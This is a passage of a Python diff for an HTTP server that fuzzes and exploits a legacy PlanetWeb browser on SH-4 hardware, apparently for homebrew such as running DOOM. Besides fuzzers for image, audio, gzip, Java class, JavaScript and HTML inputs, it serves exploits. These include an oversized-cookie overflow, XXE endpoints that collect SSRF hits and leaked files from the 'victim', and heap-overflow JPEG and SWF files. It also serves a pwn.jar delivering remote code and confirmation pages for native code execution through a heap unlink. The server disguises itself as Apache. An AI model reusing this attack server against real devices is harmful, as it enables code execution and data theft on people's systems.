+        elif op == 8 and L > hdr+4:                                    # delete a block
+            ln = random.randint(1, min(32, L-hdr-1)); q = random.randint(hdr, L-ln); del b[q:q+ln]
+        elif op == 9:                                                  # clone/insert a block
+            ln = random.randint(1,32); s = random.randint(hdr, max(hdr, L-1)); b[p:p] = bytes(b[s:s+ln]) or bytes([random.randrange(256)])
+        else:                                                          # overwrite block (repeat byte)
+            ln = random.randint(1, min(32, L-p)); b[p:p+ln] = bytes([random.randrange(256)])*ln
+    return bytes(b)
+
+def _splice(a, b):
+    """AFL splice: head of one input + tail of another (same format)."""
+    if len(a) < 4 or len(b) < 4: return a
+    return a[:random.randint(1,len(a)-1)] + b[random.randint(0,len(b)-1):]
+
+def _corpus(ext):
+    """Corpus = seeds + discovered crash culprits (known to reach deep decoder
+    code) -> mutating/splicing these finds nearby variants & new faults."""
+    files = glob.glob(str(FUZZ_SEEDS/("*."+ext)))
+    files += glob.glob(str(ROOT/"crashes"/"auto_*"/("CULPRIT_*."+ext)))
+    return files
+
+# ---- gzip transport fuzzing (HTTP Content-Encoding: gzip -> zlib 1.1.3 inflate) ----
+def _gzip_fuzz(raw):
+    """gzip-wrap a valid resource then corrupt the gzip stream -> exercises the
+    inflate/Content-Encoding path. Mutates header flags, the deflate body, or the
+    trailing CRC32/ISIZE."""
+    import gzip as _gz, io
+    buf = io.BytesIO();
+    with _gz.GzipFile(fileobj=buf, mode="wb") as g: g.write(raw)
+    b = bytearray(buf.getvalue())
+    s = random.choice(["flags","body","trailer","hdrlen","rand"])
+    if s == "flags" and len(b) > 4:                # FLG byte (FEXTRA/FNAME/FCOMMENT/FHCRC) -> bad optional-field parse
+        b[3] = random.choice([0x04,0x08,0x10,0x1f,0xe0,0xff])
+    elif s == "body" and len(b) > 14:              # corrupt deflate stream -> inflate OOB/desync
+        for _ in range(random.randint(2,10)): b[random.randint(10,len(b)-9)] = random.randrange(256)
+    elif s == "trailer" and len(b) >= 8:           # CRC32 / ISIZE mismatch
+        b[-8:] = bytes(random.randrange(256) for _ in range(8))
+    elif s == "hdrlen" and len(b) > 12:            # claim FEXTRA with huge XLEN -> over-read
+        b[3] = 0x04; b[10:10] = struct.pack("<H", random.choice([0xffff,0x1000]))
+    else:
+        for _ in range(random.randint(2,12)): b[random.randint(0,len(b)-1)] = random.randrange(256)
+    return bytes(b)
+
+# ---- Java .class loader/verifier fuzzing (PersonalJava VM; via <applet archive>) ----
+CLASS_BASE = FUZZ_SEEDS / "Pwn.class"   # minimal v45.3 applet, mutated per page
+def _class_mut(b):
+    """Mutate a Java .class to stress the PersonalJava class loader/VERIFIER:
+    magic / version / constant_pool_count / counts+indices / truncation / havoc.
+    A verifier flaw here is VM-level RCE, not just DoS."""
+    b = bytearray(b)
+    s = random.choice(["magic","ver","cpcount","cpgrow","u16","count","trunc","havoc","havoc"])
+    if   s == "magic": b[0:4] = bytes(random.randrange(256) for _ in range(4))            # break/skip magic check
+    elif s == "ver" and len(b) >= 8:  b[6:8] = struct.pack(">H", random.choice([0,46,50,99,0xffff]))   # major version
+    elif s == "cpcount" and len(b) >= 10: b[8:10] = struct.pack(">H", random.choice([0,1,0x7fff,0xffff]))  # constant_pool_count
+    elif s == "cpgrow" and len(b) >= 10:                                                  # claim more CP entries than present -> over-iterate
+        b[8:10] = struct.pack(">H", (struct.unpack(">H", bytes(b[8:10]))[0] + random.randint(50,4000)) & 0xffff)
+    elif s == "u16" and len(b) > 12:                                                      # a random u16 (index/count) -> OOB CP ref
+        p = random.randrange(8, len(b)-1); b[p:p+2] = struct.pack(">H", random.choice([0xffff,0x7fff,0]))
+    elif s == "count" and len(b) > 12:                                                    # fields/methods/attrs count -> huge
+        p = random.randrange(8, len(b)-1); b[p:p+2] = b"\xff\xff"
+    elif s == "trunc": b = b[:random.randint(8, max(9, len(b)-1))]                        # truncated class file
+    else:
+        for _ in range(random.randint(2,16)):
+            if len(b) > 4: b[random.randrange(4, len(b))] = random.randrange(256)         # havoc (keep magic)
+    return bytes(b)
+
+def _jar_pack(classbytes, clsname="Pwn.class"):
+    """Pack a (mutated) class into a valid JAR/zip so the zip layer opens cleanly
+    and the CLASS parser/verifier is what gets fuzzed."""
+    import io, zipfile
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
+        z.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\r\n\r\n")
+        z.writestr(clsname, bytes(classbytes))
+    return buf.getvalue()
+
+# ---- JavaScript engine fuzzing (native JS interpreter @0x8c18b6b0; via <script>) ----
+_JS_TOK = ["function","var","return","new ","this","prototype","eval","[]","{}","()",
+           "typeof ","delete ","with","try","catch","arguments",".length",".push",
+           "Function","Object","Array","String",".call",".apply","+","++","==","void "]
+def _js_mut(src):
+    """Mutate JS to stress the native parser/interpreter: token spam, deep nesting,
+    huge literals, malformed syntax, prototype/type-confusion idioms, deep recursion,
+    and AFL byte havoc."""
+    s = src
+    op = random.choice(["nest","deepnest","huge","dup","tok","delim","proto","recurse","afl","afl"])
+    if   op == "dup":  s = s + ("\n" + random.choice(_JS_TOK)) * random.randint(50, 600)
+    elif op == "nest":                                  # moderate nesting (deep-nest=DoS hang, confirmed; keep mixed-run usable)
+        d = random.randint(50, 4000); s = "(" * d + "1" + ")" * d + ";" + s
+    elif op == "deepnest":
+        ch = random.choice(["[", "{a:", "f("]); cl = {"[":"]", "{a:":"}", "f(":")"}[ch]
+        d = random.randint(50, 3000); s = "var z=" + ch * d + "1" + cl * d + ";" + s
+    elif op == "huge":
+        s = s + "\nvar H=" + ('"' + "A" * random.randint(1000, 30000) + '"' if random.random() < .5
+                              else "[" + "1," * random.randint(500, 8000) + "1]") + ";"
+    elif op == "tok":
+        s = s + "\n" + "".join(random.choice(_JS_TOK) + random.choice([";", "", ".", "("])
+                               for _ in range(random.randint(5, 50)))
+    elif op == "delim":
+        s = s + random.choice(["{" * random.randint(1, 300), "}" * random.randint(1, 300),
+                               "[" * random.randint(1, 300), "function(", '"' + "x" * random.randint(1, 800)])
+    elif op == "proto":
+        s = s + "\nfunction X(){};X.prototype=" + random.choice(["X", "[]", "null", "X.prototype", "new X()"]) \
+              + ";var y=new X();y.valueOf=y;y.toString=y;"
+    elif op == "recurse":                              # deep recursion (guarded so it doesn't freeze the mixed run)
+        s = "function R(n){var a=[n,n,n];return R(n+1)+R(n+2);}try{R(0)}catch(e){}\n" + s
+    else:
+        b = bytearray(s.encode("latin1", "ignore"))
+        pool = [ord(c) for c in "(){}[];=+\"'.,0Af "]
+        for _ in range(1 << random.randint(1, 5)):
+            if len(b) < 2: break
+            p = random.randrange(len(b)); b[p] = random.choice(pool + [random.randrange(256)])
+        s = b.decode("latin1")
+    return s.encode("latin1", "ignore")
+
+def _js_page(bid, driver):
+    """Page with INLINE fuzzed JS (this browser doesn't load external <script src>)
+    + an <img> beacon for crash attribution. '</' is neutralized so the mutated JS
+    can't break out of the <script> tag; the raw .js is saved for repro."""
+    js = _js_mut(open(random.choice(glob.glob(str(FUZZ_SEEDS/"*.js")))).read())
+    nm = "ff_%05d.js" % bid
+    open(str(FZ_DIR/nm), "wb").write(js)
+    inline = js.decode("latin1", "ignore").replace("</", "< /")
+    return ('<html><head>%s</head><body bgcolor=black>'
+            '<img src="/fuzz/%s" width=1 height=1>'
+            '<script>%s</script>%s</body></html>' % (driver[0], nm, inline, driver[1]))
+
+# ---- HTML lexer fuzzing (flex lexer: "scanner input buffer overflow") ----
+_HTAGS = ["html","body","table","tr","td","div","span","font","a","img","b","i","ul","li",
+          "form","input","frame","frameset","applet","script","style","title","head","p"]
+def _html_fuzz():
+    """Generate malformed HTML to stress the flex lexer / DOM builder: huge
+    attributes, deep nesting, unterminated tags, entity/comment tricks."""
+    out = []
+    for _ in range(random.randint(20, 120)):
+        c = random.random(); t = random.choice(_HTAGS)
+        if   c < 0.30: out.append("<%s %s=%s>" % (t, "x"*random.randint(1,2000), "y"*random.randint(1,4000)))  # huge attr
+        elif c < 0.45: out.append("<" + t*random.randint(1,40))                                                # unterminated / long tag name
+        elif c < 0.60: out.append("<%s>" % t * random.randint(1,60))                                           # deep nesting
+        elif c < 0.72: out.append("&" + "#"*random.randint(1,200) + str(random.randint(0,1<<20)) + ";")        # entity bomb
+        elif c < 0.82: out.append("<!--" + "-"*random.randint(1,500))                                          # unterminated comment
+        elif c < 0.90: out.append('<a href="' + "A"*random.randint(1,5000) + '">')                            # huge URL
+        else:          out.append("<%s %s>" % (t, "=\""*random.randint(1,300)))                                # malformed attr quotes
+    return "".join(out)
+
+def gen_fuzz_page(url_prefix="/fz/"):
+    """NEW fuzzer: ONE mutated image per page (exact attribution + guaranteed
+    decode) + auto-refresh to a new unique URL. ~60% JPEG (more fault-prone).
+    url_prefix lets the loop drive via /fz/ (normal) or /rp/ (so the online
+    savestate's /rp loop becomes the fuzzer -> unattended w/ fc_restore.sh)."""
+    # all native media decoders confirmed present in 1ST_READ.BIN:
+    # JPEG, GIF/LZW, PNG (libpng+zlib), SWF/Flash, WAV/RIFF. weight = pick frequency.
+    fmts = {
+        "jpg": (glob.glob(str(FUZZ_SEEDS/"*.jpg")), _jpg_mut, 3),
+        "png": (glob.glob(str(FUZZ_SEEDS/"*.png")), _png_mut, 3),
+        "gif": (glob.glob(str(FUZZ_SEEDS/"*.gif")), _gif_mut, 2),
+        "swf": (glob.glob(str(FUZZ_SEEDS/"*.swf")), _swf_mut, 1),
+        "wav": (glob.glob(str(FUZZ_SEEDS/"*.wav")), _wav_mut, 1),
+    }
+    pool = [ext for ext,(files,_,w) in fmts.items() if files for _ in range(w)]
+    if not pool: return "<html><body>no seeds</body></html>", -1
+    _fuzz_ctr[0] += 1; bid = _fuzz_ctr[0]
+    # retain the last ~16 served samples (numeric sort -> real sequence order)
+    def _kn(p):
+        m = re.search(r"ff_(\d+)", p); return int(m.group(1)) if m else 0
+    for f in sorted(glob.glob(str(FZ_DIR/"ff_*")), key=_kn)[:-16]:
+        try: os.remove(f)
+        except: pass
+    nxt = "%sn%d_%d.html" % (url_prefix, bid+1, random.randrange(1<<30))
+    driver = ('<meta http-equiv="refresh" content="%d;url=%s">' % (FUZZ_REFRESH, nxt),
+              '<script>setTimeout(function(){location.href="%s";},%d000);</script>' % (nxt, FUZZ_REFRESH))
+    kind = random.random()
+    if os.environ.get("EDEN_JSONLY") and glob.glob(str(FUZZ_SEEDS/"*.js")):
+        # JS-focused campaign: serve only fuzzed <script> so the JS engine gets
+        # sustained coverage (image decoders crash so often they starve JS).
+        return _js_page(bid, driver), bid
+    # NOTE: <applet> class loading BLOCKS the browser main thread and stalls for
+    # VALID and malformed classes alike (confirmed: a valid applet also freezes at
+    # "Applet loading"), so a HANG is NOT a verifier-bug signal and every jar page
+    # wrecks loop throughput. Class-loader fuzzing belongs in a GDB-stub harness
+    # (bp in the loader ~0x8c0f93e8), not this loop. Disabled here (set >0 to probe
+    # only for parse-time FAULTs, accepting the heavy stall cost).
+    CLASS_IN_LOOP = 0.0
+    if kind < CLASS_IN_LOOP and CLASS_BASE.exists():   # JAVA CLASS loader/verifier fuzz via <applet archive>
+        data = _jar_pack(_class_mut(open(CLASS_BASE, "rb").read()))
+        nm = "ff_%05d.jar" % bid
+        open(str(FZ_DIR/nm), "wb").write(data)
+        embed = '<applet code="Pwn.class" archive="/fuzz/%s" width=64 height=64></applet>' % nm
+        page = '<html><head>%s</head><body bgcolor=black>%s%s</body></html>' % (driver[0], embed, driver[1])
+        return page, bid
+    jsseeds = glob.glob(str(FUZZ_SEEDS/"*.js"))
+    if kind < 0.30 and jsseeds:                    # JS ENGINE fuzz: INLINE mutated <script>
+        return _js_page(bid, driver), bid
+    if kind < 0.42:                                # HTML LEXER fuzz: malformed body, loop driver kept in <head>
+        nm = "ff_%05d.html" % bid; body = _html_fuzz()
+        # beacon (attribution: registers /fuzz/ff_<n>.html in eden.log) + malformed body
+        page = ('<html><head>%s</head><body bgcolor=black>'
+                '<img src="/fuzz/%s" width=1 height=1>%s%s</body></html>'
+                % (driver[0], nm, body, driver[1]))
+        open(str(FZ_DIR/nm), "w").write(page)      # save the served page for attribution
+        return page, bid
+    if kind < 0.52:                                # gzip TRANSPORT fuzz: Content-Encoding: gzip + corrupt stream
+        iext = random.choice([e for e in ("png","jpg","gif") if fmts[e][0]] or ["png"])
+        raw = open(random.choice(fmts[iext][0]), "rb").read()
+        data = _gzip_fuzz(raw)
+        nm = "ff_%05d_gz.%s" % (bid, iext)         # "_gz." -> _serve_file sets Content-Encoding: gzip
+        open(str(FZ_DIR/nm), "wb").write(data)
+        embed = '<img src="/fuzz/%s" width=64 height=64>' % nm
+        page = '<html><head>%s</head><body bgcolor=black>%s%s</body></html>' % (driver[0], embed, driver[1])
+        return page, bid
+    # normal media fuzz (image/audio) with structure-aware + AFL strategies
+    ext = random.choice(pool); files, mut, _ = fmts[ext]
+    corpus = _corpus(ext) or files; hdr = _HDR.get(ext, 8)
+    r = random.random()
+    if r < 0.50:                                   # structure-aware field mutation (format-specific)
+        data = mut(open(random.choice(files), "rb").read())
+    elif r < 0.75:                                 # AFL havoc on a corpus member (incl. crashers)
+        data = _afl_havoc(open(random.choice(corpus), "rb").read(), hdr)
+    elif r < 0.90 and len(corpus) >= 2:            # AFL splice two corpus members, then structure-mutate
+        a = open(random.choice(corpus), "rb").read(); b2 = open(random.choice(corpus), "rb").read()
+        data = mut(_splice(a, b2))
+    else:                                          # combined: structure-mutate then havoc
+        data = _afl_havoc(mut(open(random.choice(files), "rb").read()), hdr)
+    nm = "ff_%05d.%s" % (bid, ext)
+    open(str(FZ_DIR/nm), "wb").write(data)
+    if ext == "swf":
+        embed = '<img src="/fuzz/%s" type="application/x-shockwave-flash" width=64 height=64>' % nm
+    elif ext == "wav":
+        embed = ('<bgsound src="/fuzz/%s" loop=1>'
+                 '<embed src="/fuzz/%s" autostart=true hidden=true width=2 height=2>' % (nm, nm))
+    else:
+        embed = '<img src="/fuzz/%s" width=64 height=64>' % nm
+    page = '<html><head>%s</head><body bgcolor=black>%s%s</body></html>' % (driver[0], embed, driver[1])
+    return page, bid
+
+
+class Handler(BaseHTTPRequestHandler):
+    server_version = "Apache"  # look unremarkable
+
+    def log_message(self, fmt, *args):
+        sys.stderr.write("    " + (fmt % args) + "\n")
+
+    def log_error(self, fmt, *args):
+        # capture the RAW request line on 400/bad-request -> reveals request-builder
+        # corruption (overflow garbles the request line -> "Bad request version ...")
+        raw = getattr(self, "raw_requestline", b"")
+        sys.stderr.write("    [BADREQ] " + (fmt % args) + "  raw=" + repr(raw[:300]) + "\n")
+
+    def _send(self, body, ctype, code=200, encoding=None):
+        if isinstance(body, str):
+            body = body.encode("utf-8")
+        self.send_response(code)
+        self.send_header("Content-Type", ctype)
+        if encoding:
+            self.send_header("Content-Encoding", encoding)
+        self.send_header("Content-Length", str(len(body)))
+        # defeat the browser's page/image cache so each boot refetches fresh content
+        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
+        self.send_header("Pragma", "no-cache")
+        self.send_header("Expires", "0")
+        # PATH A: oversized Set-Cookie -> browser stores it -> next request builds
+        # "Cookie: %s" (unbounded sprintf) into its request buffer -> overflow.
+        if COOKIE_N > 0:
+            self.send_header("Set-Cookie",
+                             "PA=" + "A" * COOKIE_N + "; path=/; domain=.planetweb.com; expires=Wed, 09-Jun-2027 00:00:00 GMT")
+        self.end_headers()
+        self.wfile.write(body)
+
+    def _send_binary(self, body, ctype):
+        """Resumable binary send via QUERY PARAM (/file?start=N) -- no client-side
+        setRequestProperty (absent/breaks class-load in PersonalJava 1.1.8). The staging
+        client re-opens with ?start=got so eden sends ONLY the missing tail, instead of
+        re-reading the prefix over the flaky link (skip-resume could stall on a consistent
+        drop point)."""
+        import re as _re
+        total = len(body)
+        ms = _re.search(r"[?&]start=(\d+)", self.path)
+        ml = _re.search(r"[?&]len=(\d+)", self.path)
+        start = min(int(ms.group(1)), total) if ms else 0
+        if ml:
+            end = min(start + int(ml.group(1)), total)   # bounded chunk: [start, start+len)
+        else:
+            end = total
+        chunk = body[start:end]
+        self.send_response(206 if (start or ml) else 200)
+        self.send_header("Content-Type", ctype)
+        self.send_header("Content-Length", str(len(chunk)))
+        self.end_headers()
+        self.wfile.write(chunk)
+        if start or ml:
+            print("    [CHUNK] %d-%d/%d (%d bytes)" % (start, end, total, len(chunk)))
+
+    def _xxe_log(self, kind, data):
+        try:
+            with open("/tmp/xxe_hits.log", "a") as f:
+                f.write(time.strftime("%H:%M:%S ") + kind + " :: " + str(data)[:4000] + "\n")
+        except Exception:
+            pass
+
+    def _read_body(self):
+        n = int(self.headers.get("Content-Length", 0) or 0)
+        return self.rfile.read(n) if n else b""
+
+    # ---- GET ---- #
+    def do_GET(self):
+        path = self.path.split("?", 1)[0]
+        # CLEAN mode (sentinel www/CLEAN): stop the leftover fuzz/repro auto-refresh
+        # churn -> serve a static no-refresh page for navigation + a 1x1 gif for any
+        # image so nothing "breaks" and the browser settles (eases host load while
+        # configuring the mail account).
+        if (WWW / "CLEAN").exists():
+            if path.lower().rsplit(".", 1)[-1] in ("gif", "jpg", "jpeg", "png"):
+                return self._send(bytes.fromhex(
+                    "47494638396101000100800000ffffff00000021f90400000000002c0000"
+                    "0000010001000002024401003b"), "image/gif")
+            if (path in ("/", "/junkyard.html", "/webguide", "/webguide/")
+                    or path.startswith("/rp") or path.startswith("/sp") or path.startswith("/fz")):
+                return self._send("<html><head><title>Home</title></head><body bgcolor=white>"
+                                  "<h2>PlanetWeb (offline)</h2><p>Open the Command Compass to reach "
+                                  "Mail / Options to configure your POP account.</p></body></html>",
+                                  "text/html")
+        ck = self.headers.get("Cookie")
+        if ck is not None:
+            print("[cookie] >>> victim sent Cookie header: %d bytes (host=%s)" % (len(ck), self.headers.get("Host")))
+        elif path in ("/", "/rp/0") or path.startswith("/rp/n"):
+            print("[cookie] (no Cookie on %s; host=%s)" % (path, self.headers.get("Host")))
+        # ---- XXE endpoints (hit by the victim's XML parser resolving our entities) ----
+        if path == "/xxe.dtd":
+            print("[XXE] >>> /xxe.dtd fetched (parser is loading our external DTD)")
+            self._xxe_log("dtd-fetched", self.path)
+            return self._send(xxe_dtd(), "application/xml-dtd")
+        if path == "/xxe-probe":
+            print("[XXE] *** SSRF/XXE CONFIRMED: victim resolved an external entity -> %s" % self.path)
+            self._xxe_log("ssrf-probe", self.path)
+            return self._send("ok", "text/plain")
+        if path == "/xxe-leak":
+            from urllib.parse import unquote
+            q = self.path.split("?", 1)[1] if "?" in self.path else ""
+            leaked = unquote(q[2:]) if q.startswith("f=") else q
+            print("[XXE] *** FILE EXFIL via XXE *** %d bytes:\n%s" % (len(leaked), leaked[:2000]))
+            self._xxe_log("file-leak", leaked)
+            return self._send("ok", "text/plain")
+        if path == "/pwned":
+            from urllib.parse import parse_qs, unquote
+            q = parse_qs(self.path.split("?", 1)[1]) if "?" in self.path else {}
+            devid = unquote(q.get("devid", [""])[0]); os_str = unquote(q.get("os", [""])[0])
+            print("[TAKEOVER] *** browser hijacked to full-screen OWNED page *** devid=%s os=%s" % (devid or "(none)", os_str))
+            return self._send(pwned_page(devid, os_str), "text/html")
+        if path == "/PWNED_NATIVE":
+            print("[RIDEXPLOIT] *** NATIVE CODE EXEC CONFIRMED *** SH-4 stub ran -> "
+                  "openURL(/PWNED_NATIVE) from setRawDeviceID unlink -> fn-ptr hijack")
+            return self._send("<html><body bgcolor=black text=lime><h1>NATIVE PWNED</h1>"
+                              "<p>SH-4 stub executed via setRawDeviceID heap unlink.</p></body></html>",
+                              "text/html")
+        if path == "/ridexploit-armed":
+            print("[RIDEXPLOIT] payload delivered (sendMessage(100) done); awaiting unlink + fn-ptr call")
+            return self._send("<html><body>ridexploit armed</body></html>", "text/html")
+        if path == "/armclose":
+            # armexploit navigates here to CLOSE the armed dialog -> IM teardown
+            print("[ARM] >>> /armclose (navigate to tear down the armed dialog context)")
+            return self._send("<html><body>armclose</body></html>", "text/html")
+        if path in ("/evil.jpg", "/evil2.jpg"):
+            nm = path[1:]
+            print("[JPG] >>> serving %s  ***native libjpeg heap-overflow image (get_sof/glue 32-bit malloc)***" % nm)
+            return self._serve_file(nm, "image/jpeg")
+        if (WWW/"JPGTEST").exists() and (path in ("/", "/junkyard.html", "/jpg")
+                                          or path.startswith("/rp") or path.startswith("/sp")):
+            which = "evil2.jpg" if (WWW/"JPGTEST").read_text().strip() == "2" else "evil.jpg"
+            print("[JPG] >>> JPEG-overflow test page (img=/%s)" % which)
+            return self._send('<html><head><title>jpg</title>'
+                              '<meta http-equiv="refresh" content="6"></head>'
+                              '<body bgcolor=black><img src="/%s?%d"></body></html>'
+                              % (which, int(time.time())), "text/html")
+        if path in ("/test.swf", "/evil.swf"):
+            nm = path[1:]
+            print("[SWF] >>> serving %s  ***native Flash player reachability/overflow test***" % nm)
+            return self._serve_file(nm, "application/x-shockwave-flash")
+        if (WWW/"SWFTEST").exists() and (path in ("/", "/junkyard.html", "/jpg")
+                                          or path.startswith("/rp") or path.startswith("/sp")):
+            swf = "evil.swf" if (WWW/"SWFTEST").read_text().strip() == "2" else "test.swf"
+            print("[SWF] >>> Flash test page (embed=/%s)" % swf)
+            return self._send('<html><head><title>swf</title>'
+                              '<meta http-equiv="refresh" content="8"></head>'
+                              '<body bgcolor=black>'
+                              '<embed src="/%s?%d" type="application/x-shockwave-flash" width=64 height=64>'
+                              '<img src="/%s?%d" type="application/x-shockwave-flash" width=64 height=64>'
+                              '</body></html>' % (swf, int(time.time()), swf, int(time.time())), "text/html")
+        if path in ("/edenclient.conf", "/eden.conf"):
+            print("[1] >>> serving edenclient.conf (loginurl)")
+            return self._send(edenclient_conf(), "text/plain")
+        if path == "/pwn.jar":
+            jar = CHAIN_JARS[CHAIN]
+            print("[5] >>> serving pwn.jar  [chain=%s -> %s]  ***RCE: device downloading our code***"
+                  % (CHAIN, jar.name))
+            if not jar.exists():
+                return self._send("build first (./build.sh)", "text/plain", 500)
+            return self._send(jar.read_bytes(), "application/java-archive")
+        if path == "/doom.jar":
+            print("[5b] >>> serving doom.jar  ***pulled via Jar-Files: the DOOM engine***")
+            if not DOOM_JAR.exists():
+                return self._send("build doom.jar first (./build.sh)", "text/plain", 500)
+            return self._send(DOOM_JAR.read_bytes(), "application/java-archive")
+        if path == "/doom.wad":
+            # stagedoom must serve the RENDERABLE iwad (doom1_trim: has TITLEPIC + sprites; the
+            # tiny WADs lack them and the engine I_Errors on boot). The 3.8MB stream is made
+            # reliable by StageDoom's large 256KB chunks (few picoppp connections), not by a
+            # smaller WAD. stub_native.bin is baked for THIS wad's size (build_stage_native.py).
+            wad = (ROOT/"wad"/"doom1_trim.wad") if CHAIN=="stagedoom" else (ROOT/"wad"/"doom1.wad") if CHAIN in ("nativedoom","heapprobe") else DOOM_WAD
+            print("[6] >>> serving doom.wad ("+wad.name+")")
+            if not wad.exists():
+                return self._send("put an IWAD at wad/", "text/plain", 500)
+            return self._send_binary(wad.read_bytes(), "application/octet-stream")
+        if (path.startswith("/im") or path in ("/", "/junkyard.html") or path.startswith("/rp")) and (WWW/"IMPAGE").exists():
+            # AUTO-REFRESH element-rich page: 6 links + a form = ~8 interface elements
+            # (state-2 IM structs). Meta-refresh to a unique /im URL every 2s so the
+            # browser continuously LOADS elements then TEARS THEM DOWN -> drives
+            # sub_8C034920 (the IM-teardown loop that calls the unlink gadget).
+            # STATIC page (no refresh) with dialog-arming links so the user can click
+            # one. mailto:/pwreg: schemes open the address-book/registration IM dialogs
+            # (sub_8C033584) that arm the gate 0x8C1B7488 + node structs.
+            page = ('<html><head><title>arm</title></head>'
+                    '<body bgcolor=white><h2>IM arming test</h2>'
+                    '<a href="mailto:test@planetweb.com">CLICK: mailto (address dialog)</a><br><br>'
+                    '<a href="pwreg:reg0">CLICK: pwreg (registration dialog)</a><br><br>'
+                    '<a href="/im?a=1">L1</a> <a href="/im?a=2">L2</a> <a href="/im?a=3">L3</a><br>'
+                    '<form action="/im" method="get"><input type="text" name="q" value="x" size="8">'
+                    '<input type="submit" value="Go"></form>'
+                    '</body></html>')
+            print("[im] >>> STATIC arming page (mailto/pwreg links)")
+            return self._send(page, "text/html")
+        if path in ("/", "/junkyard.html"):
+            if CHAIN == "fuzz" and (WWW/"REPRO").exists():
+                # deterministic repro: home -> /rp/0 (pinned image sequence)
+                print("[repro] >>> home -> /rp/0 (pinned fault repro)")
+                return self._send('<html><head><meta http-equiv="refresh" content="1;url=/rp/0">'
+                                  '</head><body bgcolor=black><script>location.href="/rp/0";</script>'
+                                  'repro</body></html>', "text/html")
+            if CHAIN == "fuzz" and (WWW/"SPECTRUM").exists():
+                # spectrum-triage mode: home redirects into the one-per-page /sp/ run
+                print("[spectrum] >>> home -> /sp/0 (LZW spectrum triage)")
+                return self._send('<html><head><meta http-equiv="refresh" content="1;url=/sp/0">'
+                                  '</head><body bgcolor=black><script>location.href="/sp/0";</script>'
+                                  'spectrum</body></html>', "text/html")
+            if CHAIN == "fuzz":
+                # in fuzz mode the home page IS the auto-refresh fuzz loop entry
+                html, bid = gen_fuzz_page()
+                print("[fuzz] >>> home page = fuzz batch #%d (auto-refresh loop)" % bid)
+                return self._send(html, "text/html")
+            if CHAIN == "calc":
+                # calc demo: the home page IS the calc POC, so it renders the instant the
+                # browser goes online -- independent of whether the Eden subscription (the
+                # RCE, [1]..[5]) re-fires. When the subscription DOES fire, the JAR's
+                # openURL lands on this same page. Never show the DOOM splash here.
+                print("[6] >>> serving calc.html as HOME  ***calc POC on screen***")
+                return self._serve_file("calc.html", "text/html")
+            print("[6] >>> serving junkyard.html  ***browser hijacked to splash***")
+            return self._serve_file("junkyard.html", "text/html")
+        if path == "/doom.html":
+            print("[*] >>> serving doom.html  ***DOOM applet page (inline in browser)***")
+            return self._serve_file("doom.html", "text/html")
+        if path == "/calc.html":
+            print("[6] >>> serving calc.html  ***code-exec proven: browser navigated to our page***")
+            return self._serve_file("calc.html", "text/html")
+        if path.startswith("/sp/") or path == "/sp":
+            # LZW spectrum triage: ONE crafted GIF per page, auto-advance to next.
+            # A HANG freezes the browser on /sp/<n> (last logged); a FAULT crashes.
+            specs = sorted(p.name for p in (WWW/"spectrum").glob("*.gif"))
+            m = re.search(r"/sp/(\d+)", path); n = int(m.group(1)) if m else 0
+            if n >= len(specs):
+                return self._send("<html><body>spectrum done (%d tested)</body></html>" % len(specs), "text/html")
+            nm = specs[n]
+            print("[spectrum] >>> #%d/%d : %s" % (n, len(specs), nm))
+            html = ('<html><head><meta http-equiv="refresh" content="2;url=/sp/%d"></head>'
+                    '<body bgcolor=black>%s<img src="/spectrum/%s" width=16 height=16>'
+                    '<script>setTimeout(function(){location.href="/sp/%d";},2000);</script>'
+                    '</body></html>' % (n+1, nm, nm, n+1))
+            return self._send(html, "text/html")
+        if path.startswith("/imf"):
+            # a single frame's content (links + form = focusable interface elements)
+            which = path.split("=")[-1]
+            frm = ('<html><body bgcolor=white><b>Frame %s</b><br>'
+                   '<a href="/imf?f=%s1">Link A</a><br><a href="/imf?f=%s2">Link B</a><br>'
+                   '<form action="/imf" method="get"><input type="text" name="q" value="x" size="8">'
+                   '<input type="submit" value="Go"></form></body></html>' % (which,which,which))
+            print("[imf] >>> frame content %s" % which)
+            return self._send(frm, "text/html")
+        if path.startswith("/im") or ((path.startswith("/rp/") or path == "/rp") and (WWW/"IMPAGE").exists()):
+            # MULTI-FRAME page: each <frame> is a managed content area -> registers
+            # Interface-Manager nodes (the *(0x8C3402F4)/*(0x8C29AC2C) globals).
+            frameset = ('<html><head><title>IMframes</title></head>'
+                        '<frameset rows="40%,60%">'
+                        '<frame src="/imf?f=top" name="top">'
+                        '<frameset cols="50%,50%">'
+                        '<frame src="/imf?f=left" name="left">'
+                        '<frame src="/imf?f=right" name="right">'
+                        '</frameset></frameset>'
+                        '<noframes><body><a href="/imf?f=n">no frames</a></body></noframes>'
+                        '</html>')
+            print("[im] >>> MULTI-FRAME interface-manager page")
+            return self._send(frameset, "text/html")
+        if path.startswith("/rp/") or path == "/rp":
+            if (WWW/"RPFUZZ").exists():
+                # unattended fuzz via the online-savestate /rp loop: fresh mutation
+                # per page, driving back into /rp/ (cache-proof). Crashes recovered
+                # by fc_restore.sh. Exact attribution via /fuzz/ff_<n> samples.
+                html, bid = gen_fuzz_page("/rp/")
+                print("[rpfuzz] >>> /rp fuzz page #%d" % bid)
+                return self._send(html, "text/html")
+            # deterministic fault repro: pinned images from www/repro/, one per
+            # page, slow auto-advance, looping. Use to reproduce a found FAULT
+            # under the GDB stub (set bp in the decoder before navigating here).
+            reps = sorted(p.name for p in (WWW/"repro").glob("*"))
+            m = re.search(r"/rp/(\d+)", path); n = int(m.group(1)) if m else 0
+            if not reps:
+                return self._send("<html><body>no repro images</body></html>", "text/html")
+            nm = reps[n % len(reps)]; nxt = (n + 1) % len(reps)
+            ext = nm.rsplit(".", 1)[-1].lower()
+            # cache-proof: unique token on BOTH the next-page URL and the image src
+            # so the browser can't stick on a cached /rp/<n> page or image (lets the
+            # full 36->37->38 sequence advance even mid-session).
+            tok = random.randrange(1 << 30)
+            # embed per type so isolation repro drives the correct decoder
+            if ext == "jar":
+                rembed = '<applet code="Pwn.class" archive="/repro/%s?z=%d" width=64 height=64></applet>' % (nm, tok)
+            elif ext == "swf":
+                rembed = '<img src="/repro/%s?z=%d" type="application/x-shockwave-flash" width=64 height=64>' % (nm, tok)
+            elif ext == "wav":
+                rembed = ('<bgsound src="/repro/%s?z=%d" loop=1>'
+                          '<embed src="/repro/%s?z=%d" autostart=true hidden=true width=2 height=2>' % (nm, tok, nm, tok))
+            else:
+                rembed = '<img src="/repro/%s?z=%d" width=64 height=64>' % (nm, tok)
